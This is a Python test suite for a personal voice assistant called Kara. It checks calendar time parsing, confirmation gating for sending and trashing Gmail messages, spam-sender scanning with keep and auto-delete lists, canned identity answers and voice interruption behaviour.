    approval.set_confirmer(lambda prompt, allow_always=True: seen.append(allow_always) or False)
    # auto-approve mode is IGNORED for always_ask actions
    with mock.patch.object(config, "COMMAND_APPROVAL", "auto"):
        assert approval.confirm_action("calendar write?", always_ask=True) is False  # still asked
        assert approval.confirm_action("normal action?") is True   # normal action: auto short-circuits
    # a prior "yes to all" does NOT suppress an always_ask action
    approval.confirm_auto()
    assert approval.confirm_action("normal?") is True              # latched on
    assert approval.confirm_action("calendar write?", always_ask=True) is False  # still asks
    # always_ask never offers "always" to the confirmer
    assert seen and all(flag is False for flag in seen)
    approval.reset()


def test_calendar_skill_routes():
    import skills
    def matched(text):
        return [s["name"] for s in skills.match_skills(text)]
    assert "calendar" in matched("what's on my calendar tomorrow")
    assert "calendar" in matched("schedule a meeting on my calendar friday")
    assert "calendar" in matched("am i free tuesday afternoon")
    assert "calendar" in matched("cancel my dentist appointment")
    assert matched("write a poem about the ocean") == []


def test_calendar_time_resolution():
    import datetime
    from tools import calendar_tool as c
    # fixed reference: Wednesday 2026-06-17 10:00, +00:00
    now = datetime.datetime(2026, 6, 17, 10, 0, tzinfo=datetime.timezone.utc)
    assert now.weekday() == 2  # sanity: Wednesday

    def parses(s):  # valid RFC3339 the Calendar API will accept
        return bool(s) and isinstance(datetime.datetime.fromisoformat(s), datetime.datetime)

    # relative phrases expand into a well-formed future window
    start, end = c._relative_window("next week", now)
    assert start.weekday() == 0 and start > now            # next Monday
    assert (end.date() - start.date()).days == 6           # through Sunday
    assert c._relative_window("tomorrow", now)[0].date() == datetime.date(2026, 6, 18)
    assert c._relative_window("this week", now)[1].weekday() == 6  # ends Sunday

    # date-only and naive inputs become RFC3339; full timestamps pass through
    assert c._normalize_dt("2026-06-23", False, now).startswith("2026-06-23T00:00")
    assert c._normalize_dt("2026-06-23", True, now).startswith("2026-06-23T23:59")
    assert c._normalize_dt("2026-06-23T15:00:00+00:00", False, now) == "2026-06-23T15:00:00+00:00"

    # _resolve_window never yields the bad inputs that used to 400
    tmin, tmax = c._resolve_window("next week", None, now)
    assert parses(tmin) and parses(tmax)
    tmin, tmax = c._resolve_window("2026-06-23", "2026-06-30", now)
    assert parses(tmin) and parses(tmax)
    tmin, tmax = c._resolve_window(None, None, now)         # empty → now, no max
    assert parses(tmin) and tmax is None
    # a relative time_min WITH an explicit time_max normalizes BOTH (the raw phrase
    # used to be passed straight through and 400 the API)
    tmin, tmax = c._resolve_window("this week", "next week", now)
    assert parses(tmin) and parses(tmax) and "week" not in tmax
    tmin, tmax = c._resolve_window("today", "2026-06-30", now)
    assert parses(tmin) and parses(tmax)


def test_chat_model_routing():
    import llm
    captured = {}
    class _Resp: pass
    with mock.patch.object(llm.client.chat.completions, "create",
                           side_effect=lambda **kw: captured.update(kw) or _Resp()):
        llm.chat([{"role": "user", "content": "hi"}])                       # default
        assert captured["model"] == config.CHAT_MODEL
        llm.chat([{"role": "user", "content": "hi"}], model=config.FAST_MODEL)
        assert captured["model"] == config.FAST_MODEL
        llm.chat([{"role": "user", "content": "hi"}], model=config.REASONING_MODEL)
        assert captured["model"] == config.REASONING_MODEL


def test_reasoning_think_tool():
    from tools import reasoning
    # the <think> chain-of-thought is stripped; only the conclusion remains
    assert reasoning._strip_think("<think>long winded\nreasoning</think>  Answer: 42") == "Answer: 42"
    assert reasoning._strip_think("no tags here") == "no tags here"
    assert reasoning._strip_think("reasoning...</think>final") == "final"   # truncated trace
    # registered as a tool only when reasoning is enabled (off by default for now)
    from tools import TOOL_FUNCTIONS
    assert ("think" in TOOL_FUNCTIONS) == config.REASONING_ENABLED
    # a failing reasoning model degrades to an ERROR string, never raises
    with mock.patch.object(reasoning, "chat", side_effect=RuntimeError("model not pulled")):
        out = reasoning.think("plan a refactor")
        assert out.startswith("ERROR:") and "unavailable" in out


def test_identity_questions_get_fixed_answer():
    import main
    # identity / origin / tech questions are detected...
    for q in ["what are you", "who created you", "who built you", "what are you made of",
              "what technologies are you made of", "what llm are you", "what kind of ai are you",
              "how were you built", "what's your tech stack", "are you an llm"]:
        assert main._is_identity_question(q), q
    # ...and ordinary "what/who are you ..." activity questions are NOT
    for q in ["what are you doing", "what are you up to", "what are you cooking",
              "who are you meeting today", "who are you talking to", "what time is it",
              "what model car should i buy", "are you free tuesday"]:
        assert not main._is_identity_question(q), q
    # process_turn answers from a variation without calling the model
    msgs = [{"role": "system", "content": "sys"}]
    reply = main.process_turn(msgs, "what are you made of?")
    assert reply in main._IDENTITY_ANSWERS
    # the exchange is recorded in history (user + assistant), no tool/model round-trip
    assert msgs[-1]["role"] == "assistant" and msgs[-1]["content"] == reply
    # several variations to rotate, each carrying the core tech facts...
    assert len(main._IDENTITY_ANSWERS) >= 3
    for ans in main._IDENTITY_ANSWERS:
        for token in ("Python", "Gemma", "Qwen3", "DeepSeek"):
            assert token in ans, (token, ans)
    # ...but on general "what are you" answers, Wontaek Shin is in only some, not all
    credited = [a for a in main._IDENTITY_ANSWERS if "Wontaek Shin" in a]
    assert 0 < len(credited) < len(main._IDENTITY_ANSWERS)


def test_creator_questions_always_credit_wontaek():
    import main
    # "who made/built/created you", "who's your creator" → creator bucket
    for q in ["who made you", "who created you", "who built you", "who designed you",
              "who wrote you", "who's your creator", "who is your maker",
              "who is your developer", "who programmed you"]:
        assert main._is_creator_question(q), q
        assert main._is_identity_question(q), q          # still short-circuits
    # general identity / activity questions are NOT creator questions
    for q in ["what are you", "what are you made of", "who are you", "what llm are you",
              "what are you doing", "who are you meeting today"]:
        assert not main._is_creator_question(q), q
    # EVERY creator answer names Wontaek Shin, and there are a few to rotate
    assert len(main._CREATOR_ANSWERS) >= 2
    assert all("Wontaek Shin" in a for a in main._CREATOR_ANSWERS)
    # process_turn routes a creator question to a Wontaek-crediting answer
    msgs = [{"role": "system", "content": "sys"}]
    reply = main.process_turn(msgs, "who made you?")
    assert reply in main._CREATOR_ANSWERS and "Wontaek Shin" in reply


def test_voice_summary_timeout_falls_back_and_never_hangs():
    import main
    import llm
    long_reply = " ".join(f"word{i}" for i in range(200))
    # a stalled/erroring summary model must NOT hang — fall back to a truncation
    # (_voice_summary does `from llm import chat`, so patch the source: llm.chat)
    with mock.patch.object(llm, "chat", side_effect=TimeoutError("model load stalled")):
        out = main._voice_summary(long_reply)
    assert out and out.endswith("…")
    assert len(out.split()) <= 76  # ~75-word truncation, not the full 200
    # an empty model response also falls back rather than returning ""
    empty = mock.Mock()
    empty.choices = [mock.Mock(message=mock.Mock(content=""))]
    with mock.patch.object(llm, "chat", return_value=empty):
        assert main._voice_summary(long_reply).split()


def test_chat_passes_timeout_through():
    import llm
    captured = {}
    with mock.patch.object(llm.client.chat.completions, "create",
                           side_effect=lambda **kw: captured.update(kw)):
        llm.chat([{"role": "user", "content": "hi"}], timeout=12)
        assert captured.get("timeout") == 12
        captured.clear()
        llm.chat([{"role": "user", "content": "hi"}])      # no timeout → kwarg omitted
        assert "timeout" not in captured


def test_voice_rearm_idle_clock():
    """Wake word re-arms after `timeout` seconds of no REAL input — robust to a run of
    noise blips that would otherwise reset the per-listen timer forever."""
    import main
    T = 5
    # clean silence (listen_vad returned None) → re-arm immediately
    assert main._should_rearm(None, 0.0, T) is True
    # empty/noise blips keep the conversation open until the idle window elapses...
    assert main._should_rearm("", 1.0, T) is False
    assert main._should_rearm("", T - 0.1, T) is False
    # ...then re-arm once enough wall-clock idle time has passed (no per-call reset)
    assert main._should_rearm("", T, T) is True
    assert main._should_rearm("", 30.0, T) is True
    # a real utterance always keeps the conversation active
    assert main._should_rearm("turn on the lights", 99.0, T) is False


def test_age_birthday_questions_answer_first_person():
    import main
    import re as _re
    # birth / age / birthday questions are detected and route to the age answer
    for q in ["when were you born", "when were you made", "how old are you",
              "what's your birthday", "what is your age", "do you have a birthday"]:
        assert main._is_age_question(q), q
        assert main._is_identity_question(q), q       # short-circuits, no model call
        assert not main._is_creator_question(q), q    # not a "who made you" question
    # answers are first-person, claim no human birthday, and invent no date/year
    assert len(main._AGE_ANSWERS) >= 2
    for ans in main._AGE_ANSWERS:
        assert not _re.search(r"20\d\d", ans), ans    # no fabricated birth year
        assert "You were born" not in ans             # never the flipped-pronoun bug
    # process_turn answers a birth question from the age set (not user-as-subject)
    msgs = [{"role": "system", "content": "sys"}]
    reply = main.process_turn(msgs, "when were you born?")
    assert reply in main._AGE_ANSWERS


def test_birthplace_distinction_ai_vs_creator():
    import main
    # the AI's own birthplace → Reno (never the creator's Daegu)
    for q in ["where were you born", "where are you from", "what's your hometown",
              "where were you built"]:
        assert main._is_birthplace_question(q), q
        assert not main._is_creator_origin_question(q), q
    # the creator's birthplace → Daegu (never the AI's Reno)
    for q in ["where was your creator born", "where was Wontaek Shin born",
              "where is Wontaek from", "what's your creator's hometown"]:
        assert main._is_creator_origin_question(q), q
        assert not main._is_birthplace_question(q), q
    # every answer keeps the two places straight
    assert all("Reno" in a and "Daegu" not in a for a in main._BIRTHPLACE_YOU_ANSWERS)
    assert all("Daegu" in a and "Reno" not in a for a in main._CREATOR_ORIGIN_ANSWERS)
    # process_turn routes each to the right place, with creator-origin winning over self
    msgs = [{"role": "system", "content": "sys"}]
    assert "Reno" in main.process_turn(msgs, "where were you born?")
    assert main.process_turn(msgs, "where was your creator born?").count("Daegu") == 1
    assert "Reno" not in main.process_turn(msgs, "where was Wontaek born?")
    # "when were you born" still has no fabricated date but now names the birthplace
    age = main.process_turn(msgs, "when were you born?")
    assert "Reno" in age


def test_gmail_parsing_and_send_gate():
    import base64
    import approval
    from tools import gmail_tool

    def b64(s):
        return base64.urlsafe_b64encode(s.encode()).decode()

    # header lookup is case-insensitive; body extraction walks nested parts (text/plain)
    payload = {"mimeType": "multipart/alternative",
               "headers": [{"name": "Subject", "value": "Hi"}, {"name": "From", "value": "Bob <b@x.com>"}],
               "parts": [{"mimeType": "text/html", "body": {"data": b64("<p>ignore</p>")}},
                         {"mimeType": "text/plain", "body": {"data": b64("hello world")}}]}
    assert gmail_tool._header(payload, "subject") == "Hi"
    assert gmail_tool._plain_text(payload) == "hello world"

    # send is gated: a declined confirmation means nothing is sent
    approval.reset()
    approval.set_confirmer(lambda prompt, allow_always=True: False)
    fake = mock.MagicMock()
    with mock.patch.object(gmail_tool, "_service", return_value=fake):
        out = gmail_tool.send_message("a@b.com", "subj", "body")
    assert out.startswith("DENIED")
    fake.users().messages().send.assert_not_called()
    approval.reset()


def test_email_skill_routes():
    import skills
    def matched(text):
        return [s["name"] for s in skills.match_skills(text)]
    assert "email" in matched("any new email from kevin?")
    assert "email" in matched("check my inbox")
    assert "email" in matched("unsubscribe me from these newsletters")
    assert "email" in matched("delete that email")
    assert "email" not in matched("write a poem about the ocean")


class _FakeReq:
    def __init__(self, val): self._val = val
    def execute(self): return self._val

class _FakeMessages:
    def __init__(self, msgs):
        self.msgs = msgs           # id -> list of header dicts
        self.last_q = None
        self.batched = None
    def list(self, userId=None, q=None, maxResults=None):
        import re
        self.last_q = q
        ids = list(self.msgs)
        # honor a "from:<addr>" filter (used by the per-sender true-count query)
        m = re.search(r"from:(\S+)", q or "")
        if m:
            addr = m.group(1)
            ids = [i for i in self.msgs
                   if any(addr in h.get("value", "") for h in self.msgs[i])]
        return _FakeReq({"messages": [{"id": i} for i in ids]})
    def list_next(self, req, resp): return None
    def get(self, userId=None, id=None, format=None, metadataHeaders=None):
        return _FakeReq({"payload": {"headers": self.msgs[id]}})
    def batchModify(self, userId=None, body=None):
        self.batched = body
        return _FakeReq({})

class _FakeSvc:
    def __init__(self, msgs): self._m = _FakeMessages(msgs)
    def users(self): return self
    def messages(self): return self._m


def _hdr(frm, unsub=False):
    h = [{"name": "From", "value": frm}]
    if unsub:
        h.append({"name": "List-Unsubscribe", "value": "<mailto:x@y.com>"})
    return h


def test_spam_find_candidates_threshold_and_grouping():
    from tools import gmail_tool
    msgs = {}
    for i in range(12):                       # 12 unread from the spammer (> 10)
        msgs[f"a{i}"] = _hdr("Spammy <deals@spam.com>", unsub=True)
    for i in range(3):                        # 3 from a real person (under threshold)
        msgs[f"b{i}"] = _hdr("Kevin <kevin@x.com>")
    with mock.patch.object(gmail_tool, "_service", return_value=_FakeSvc(msgs)):
        cands = gmail_tool.find_spam_candidates(threshold=10)
    assert len(cands) == 1
    c = cands[0]
    assert c["sender"] == "deals@spam.com" and c["count"] == 12 and c["unsubscribe"] is True


def test_spam_trash_from_sender_unread_only_and_gated():
    import approval
    from tools import gmail_tool
    msgs = {"a0": _hdr("deals@spam.com"), "a1": _hdr("deals@spam.com")}
    svc = _FakeSvc(msgs)
    # declined → nothing trashed
    approval.reset()
    approval.set_confirmer(lambda prompt, allow_always=True: False)
    with mock.patch.object(gmail_tool, "_service", return_value=svc):
        out = gmail_tool.trash_from_sender("deals@spam.com")
    assert out.startswith("DENIED") and svc._m.batched is None
    # the query is restricted to UNREAD (never deletes read mail)
    assert "is:unread" in svc._m.last_q and "from:deals@spam.com" in svc._m.last_q
    # approved → batch-trashes exactly those ids via the TRASH label
    approval.set_confirmer(lambda prompt, allow_always=True: True)
    with mock.patch.object(gmail_tool, "_service", return_value=svc):
        out = gmail_tool.trash_from_sender("deals@spam.com")
    assert "Moved 2" in out
    assert svc._m.batched["addLabelIds"] == ["TRASH"] and len(svc._m.batched["ids"]) == 2
    approval.reset()


def test_spam_log_roundtrip_and_skill(tmp_path):
    import importlib, config, spam, skills
    with mock.patch.object(config, "SPAM_LOG_PATH", str(tmp_path / "spam.json")):
        importlib.reload(spam)
        assert spam.load_candidates() == []
        spam.record_candidates([{"sender": "deals@spam.com", "count": 14, "unsubscribe": True}])
        got = spam.load_candidates()
        assert got and got[0]["sender"] == "deals@spam.com" and got[0]["count"] == 14
        assert spam.last_scan_age() is not None and spam.last_scan_age() < 60
    importlib.reload(spam)
    # the cleanup skill is routed by the right phrases
    names = lambda t: [s["name"] for s in skills.match_skills(t)]
    assert "spam-cleanup" in names("spam cleanup")
    assert "spam-cleanup" in names("declutter my inbox")


def test_spam_keep_list_excludes_senders(tmp_path):
    import importlib, config, spam
    from tools import gmail_tool
    with mock.patch.object(config, "SPAM_KEEP_PATH", str(tmp_path / "keep.json")):
        importlib.reload(spam)
        assert spam.load_keep() == set()
        # exact address and bare-domain entries both match
        spam.add_keep(["team@app.fullstory.com", "metorik.com"])
        assert spam.is_kept("team@app.fullstory.com")
        assert spam.is_kept("no-reply@metorik.com")        # domain match
        assert not spam.is_kept("noreply@spam.com")
        # find_spam_candidates skips kept senders even when over threshold
        msgs = {}
        for i in range(15):
            msgs[f"k{i}"] = _hdr("Keep <team@app.fullstory.com>")
        for i in range(12):
            msgs[f"s{i}"] = _hdr("Spam <deals@spam.com>")
        with mock.patch.object(gmail_tool, "_service", return_value=_FakeSvc(msgs)):
            cands = gmail_tool.find_spam_candidates(threshold=10, exclude=spam.load_keep())
        senders = {c["sender"] for c in cands}
        assert "deals@spam.com" in senders
        assert "team@app.fullstory.com" not in senders     # kept → excluded
    importlib.reload(spam)


def test_voice_interrupt_mode_selection():
    import config, voice
    # the configured mode picks the right interrupter (keypress vs voice barge-in)
    with mock.patch.object(config, "VOICE_INTERRUPT", "key"):
        assert voice._interrupter() is voice._wait_or_key
    with mock.patch.object(config, "VOICE_INTERRUPT", "voice"):
        assert voice._interrupter() is voice._wait_or_voice


def test_speak_interruptible_routes_waiter_and_reports_interrupt():
    import config, voice
    # force the `say` path (no piper) and capture which waiter speak_interruptible uses
    seen = {}
    def fake_waiter(proc):
        seen["used"] = True
        return True  # pretend the user interrupted
    with mock.patch.object(config, "TTS_ENGINE", "say"), \
            mock.patch.object(voice, "_interrupter", return_value=fake_waiter), \
            mock.patch.object(voice.subprocess, "Popen", return_value=mock.Mock()):
        assert voice.speak_interruptible("hello there") is True   # interrupt propagates
    assert seen.get("used")


def test_spam_autodelete_list_and_auto_trash(tmp_path):
    import importlib, config, spam, approval
    from tools import gmail_tool
    with mock.patch.object(config, "SPAM_AUTODELETE_PATH", str(tmp_path / "block.json")):
        importlib.reload(spam)
        assert spam.load_autodelete() == set()
        spam.add_autodelete(["deals@spam.com", "junk.com"])
        assert spam.is_autodelete("deals@spam.com")
        assert spam.is_autodelete("promo@junk.com")          # domain match
        assert not spam.is_autodelete("kevin@work.com")

        # auto_trash_blocked trashes unread WITHOUT any confirmation (pre-authorized),
        # even with a confirmer that would decline — unlike trash_from_sender.
        msgs = {f"d{i}": _hdr("deals@spam.com") for i in range(5)}
        svc = _FakeSvc(msgs)
        approval.reset()
        approval.set_confirmer(lambda prompt, allow_always=True: False)   # would decline
        with mock.patch.object(gmail_tool, "_service", return_value=svc):
            total, per = gmail_tool.auto_trash_blocked(["deals@spam.com"])
        assert total == 5 and per["deals@spam.com"] == 5
        assert svc._m.batched["addLabelIds"] == ["TRASH"]   # trashed despite decline
        # the gated path still refuses without approval (unchanged behavior)
        svc2 = _FakeSvc({"x": _hdr("deals@spam.com")})
        with mock.patch.object(gmail_tool, "_service", return_value=svc2):
            assert gmail_tool.trash_from_sender("deals@spam.com").startswith("DENIED")
        assert svc2._m.batched is None
        approval.reset()
    importlib.reload(spam)


def test_spam_subdomain_match_and_numbering_and_chunking():
    import spam
    from tools import gmail_tool
    # subdomain matching: a 'regenics.com' entry covers send.regenics.com, not atlassian.net
    entries = {"regenics.com"}
    assert spam.matches("grayson@regenics.com", entries)
    assert spam.matches("info@send.regenics.com", entries)
    assert not spam.matches("jira@regenics.atlassian.net", entries)

    # find_spam_candidates excludes a whole domain (incl. subdomains)
    msgs = {}
    for i in range(15):
        msgs[f"r{i}"] = _hdr("Team <info@send.regenics.com>")
    for i in range(12):
        msgs[f"s{i}"] = _hdr("Spam <deals@spam.com>")
    with mock.patch.object(gmail_tool, "_service", return_value=_FakeSvc(msgs)):
        cands = gmail_tool.find_spam_candidates(threshold=10, exclude={"regenics.com"})
    assert {c["sender"] for c in cands} == {"deals@spam.com"}      # regenics excluded

    # numbered formatting
    text = gmail_tool._format_candidates(
        [{"sender": "a@x.com", "count": 9, "unsubscribe": True},
         {"sender": "b@y.com", "count": 4, "unsubscribe": False}])
    assert "1. a@x.com — 9 unread  (can unsubscribe)" in text
    assert "2. b@y.com — 4 unread" in text

    # _trash_ids chunks into batches of 1000
    calls = []
    svc = _FakeSvc({})
    svc._m.batchModify = lambda userId=None, body=None: (calls.append(len(body["ids"])) or _FakeReq({}))
    gmail_tool._trash_ids(svc, [str(i) for i in range(1500)])
    assert calls == [1000, 500]


class _PagedSvc:
    """Fake Gmail with pageToken pagination, for the resumable batched scan."""
    def __init__(self, msgs, page=500):
        self.msgs = msgs                 # id -> headers
        self.page = page
        self.order = list(msgs)
    def users(self): return self
    def messages(self): return self
    def list(self, userId=None, q=None, maxResults=None, pageToken=None):
        if maxResults == 1:              # the resultSizeEstimate probe
            return _FakeReq({"resultSizeEstimate": len(self.msgs)})
        start = int(pageToken) if pageToken else 0
        chunk = self.order[start:start + self.page]
        nxt = start + self.page
        body = {"messages": [{"id": i} for i in chunk]}
        if nxt < len(self.order):
            body["nextPageToken"] = str(nxt)
        return _FakeReq(body)
    def get(self, userId=None, id=None, format=None, metadataHeaders=None):
        return _FakeReq({"payload": {"headers": self.msgs[id]}})


def test_spam_batched_scan_checkpoints_and_resumes(tmp_path):
    import importlib, config, spam
    from tools import gmail_tool
    msgs = {}
    for i in range(1200):                # 1200 unread, paginated 500/page
        msgs[f"x{i}"] = _hdr("deals@spam.com") if i % 2 == 0 else _hdr("kevin@work.com")
    with mock.patch.object(config, "SPAM_SCAN_STATE_PATH", str(tmp_path / "state.json")), \
            mock.patch.object(config, "SPAM_BATCH_SIZE", 500):
        importlib.reload(spam)
        notes = []
        spam.set_announcer(lambda m: notes.append(m))
        with mock.patch.object(gmail_tool, "_service", return_value=_PagedSvc(msgs)):
            cands = gmail_tool.scan_candidates_batched(threshold=10)
        # both senders exceed 10 → both flagged, with exact counts (600 each)
        counts = {c["sender"]: c["count"] for c in cands}
        assert counts == {"deals@spam.com": 600, "kevin@work.com": 600}
        assert any("Scanned" in n for n in notes)            # announced progress
        assert not spam.load_scan_state()                    # checkpoint cleared on success

    # resume: a checkpoint mid-scan continues, not restarts
    with mock.patch.object(config, "SPAM_SCAN_STATE_PATH", str(tmp_path / "state2.json")):
        importlib.reload(spam)
        spam.save_scan_state({"by_sender": {"deals@spam.com": 300}, "unsub": {},
                              "scanned": 600, "page_token": "600", "total_est": 1200})
        with mock.patch.object(gmail_tool, "_service", return_value=_PagedSvc(msgs)):
            cands = gmail_tool.scan_candidates_batched(threshold=10)
        # picked up the 300 already counted + the remaining page (ids 600..1199)
        assert {c["sender"] for c in cands} == {"deals@spam.com", "kevin@work.com"}
        assert dict((c["sender"], c["count"]) for c in cands)["deals@spam.com"] == 600
    importlib.reload(spam)


def test_short_reaction_steers_to_last_topic():
    import main
    # whole-message reactions are detected; longer questions are not
    for s in ["Really?", "really", "Are you sure?", "Seriously?", "Why?", "No way",
              "wait what", "how come", "says who", "huh", "wow", "is that right"]:
        assert main._is_short_reaction(s), s
    for s in ["what is the weather tomorrow", "why is the sky blue", "who made you",
              "tell me about Tokyo", "really long story about my trip"]:
        assert not main._is_short_reaction(s), s

    # process_turn folds a steer into the turn that pins the model to the last topic
    captured = {}
    def fake_agent(messages, on_token=None):
        captured["turn"] = messages[-1]["content"]
        return "Yes, that forecast holds."
    msgs = [{"role": "system", "content": "sys"},
            {"role": "user", "content": "weather in Tokyo tomorrow?"},
            {"role": "assistant", "content": "Partly cloudy, 25C."}]
    with mock.patch.object(main, "agent_turn", fake_agent), \
            mock.patch.object(main, "recall", lambda q: []):
        main.process_turn(msgs, "Really?")
    assert "short reaction" in captured["turn"]
    assert "talking about yourself" in captured["turn"]   # explicitly blocks identity drift

    # a normal turn gets NO steer
    captured.clear()
    msgs2 = [{"role": "system", "content": "sys"},
             {"role": "assistant", "content": "hi"}]
    with mock.patch.object(main, "agent_turn", fake_agent), \
            mock.patch.object(main, "recall", lambda q: []):
        main.process_turn(msgs2, "what is the capital of France?")
    assert "short reaction" not in captured["turn"]


def test_self_facts_override_canned_identity(tmp_path):
    import importlib, config, main, self_facts
    with mock.patch.object(config, "SELF_FACTS_PATH", str(tmp_path / "self.json")):
        importlib.reload(self_facts)
        # capture: the creator teaching Kara its own facts
        assert main._capture_self_fact("You were born on June 20th, 2026. Can you remember that forever?") \
            == ("birthday", "June 20th, 2026")
        assert main._capture_self_fact("your birthday is July 1") == ("birthday", "July 1")
        assert main._capture_self_fact("you were born in Tokyo") == ("birthplace", "Tokyo")
        # NOT a self-fact: a question, or a fact about the user
        assert main._capture_self_fact("when were you born?") is None
        assert main._capture_self_fact("I was born in Daegu") is None

        def fake_agent(messages, on_token=None):
            return "x"
        msgs = [{"role": "system", "content": "sys"}]
        with mock.patch.object(main, "agent_turn", fake_agent), \
                mock.patch.object(main, "recall", lambda q: []):
            # setting it returns a confirmation and persists (NOT a user-memory save)
            r = main.process_turn(msgs, "You were born on June 20th, 2026. Remember that forever.")
            assert "birthday is June 20th, 2026" in r
            assert self_facts.get("birthday") == "June 20th, 2026"
            # asking now reports the taught birthday, not the canned "no birth date"
            r2 = main.process_turn(msgs, "So when were you born?")
            assert "June 20th, 2026" in r2 and "don't have a birth" not in r2.lower()
    importlib.reload(self_facts)


def test_multi_account_resolution_and_id_tags():
    import config
    from tools import google_auth, gmail_tool
    with mock.patch.object(config, "GOOGLE_ACCOUNTS", ["work", "personal"]):
        # first label keeps token.json (back-compat); others get token_<label>.json
        assert google_auth._token_path("work") == config.GOOGLE_TOKEN_PATH
        assert google_auth._token_path("personal").endswith("token_personal.json")
        assert google_auth.primary_account() == "work"
        # accounts_for: only authorized accounts (have a token file) are returned.
        # available_accounts scans disk, so mock both exists + listdir (only token.json).
        with mock.patch("os.path.exists", lambda p: p == config.GOOGLE_TOKEN_PATH), \
                mock.patch("os.listdir", lambda d: ["token.json"]):
            assert google_auth.available_accounts() == ["work"]
            assert google_auth.accounts_for(None) == ["work"]          # aggregate = authorized
            assert google_auth.accounts_for("personal") == []          # not authorized yet
            assert google_auth.accounts_for("work") == ["work"]
    # the 'account:id' tag from list_messages round-trips
    assert gmail_tool._split_id("personal:abc123") == ("personal", "abc123")
    assert gmail_tool._split_id("plainid") == (None, "plainid")


def test_voice_barge_in_requires_two_words():
    import config, voice
    # default threshold is 2 words; a cough/blip/single word must NOT interrupt
    assert config.VOICE_BARGE_MIN_WORDS == 2
    for noise in ["", "  ", "uh", "hey", "mm"]:
        assert not voice._enough_words(noise), noise
    # real speech (>= 2 words) interrupts
    for speech in ["stop talking", "hold on Kara", "wait a second please"]:
        assert voice._enough_words(speech), speech
    # threshold is configurable
    with mock.patch.object(config, "VOICE_BARGE_MIN_WORDS", 3):
        assert not voice._enough_words("stop talking")     # 2 words < 3
        assert voice._enough_words("please stop talking")  # 3 words
